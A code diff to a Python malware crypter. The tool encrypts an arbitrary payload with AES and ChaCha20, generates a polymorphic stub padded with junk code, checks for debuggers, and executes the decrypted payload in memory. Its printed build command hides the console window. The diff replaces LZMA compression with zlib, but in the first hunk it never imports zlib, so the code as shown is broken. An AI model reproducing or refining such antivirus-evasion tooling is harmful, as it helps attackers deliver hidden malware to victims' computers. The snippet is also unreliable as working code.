@@ -14,7 +14,6 @@ import binascii
 import base64
 from Crypto.Cipher import AES, ChaCha20
 from Crypto.Util.Padding import pad, unpad
-import lzma
 
 # ======================
 # CONFIGURATION SETTINGS
@@ -38,8 +37,8 @@ def encrypt_payload(payload_path, output_stub_path):
     with open(payload_path, 'rb') as f:
         payload = f.read()
     
-    print("[📦] Compressing payload with LZMA...")
-    compressed = lzma.compress(payload, preset=9 | lzma.PRESET_EXTREME)
+    print("[📦] Compressing payload with Zlib...")
+    compressed = zlib.compress(payload, level=9)
     
     print("[🔑] Generating encryption keys...")
     aes_key = os.urandom(32)
@@ -85,7 +84,7 @@ def encrypt_payload(payload_path, output_stub_path):
         ))
     
     print(f"[✅] Polymorphic stub generated: {output_stub_path}")
-    print("[🔧] Compile with: pyinstaller --onefile --noconsole --clean --add-data 'dummy.txt;.' --upx-dir=UPX {output_stub_path}")
+    print("[🔧] Compile with: pyinstaller --onefile --noconsole --clean stub.py")
 
 # ========================
 # POLYMORPHIC CODE ENGINE
@@ -152,7 +151,7 @@ def anti_debug():
         debugger_present = ctypes.c_int(0)
         ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
             ctypes.windll.kernel32.GetCurrentProcess(),
-            ctypes.byref(debugger_present)
+            ctypes.byref(debugger_present))
         if debugger_present.value:
             return True
             
@@ -525,7 +524,7 @@ import winreg
 import cpuinfo
 from Crypto.Cipher import AES, ChaCha20
 from Crypto.Util.Padding import unpad
-import lzma
+import zlib
 
 # =====================
 # POLYMORPHIC JUNK CODE
@@ -745,7 +744,7 @@ class {class_name}:
             
             # Decrypt and decompress payload
             compressed = decrypt_payload(encrypted, chacha_key, chacha_nonce, aes_key, aes_iv, salt, magic)
-            payload = lzma.decompress(compressed)
+            payload = zlib.decompress(compressed)
             
             # Execute payload in memory
             execute_memory(payload)
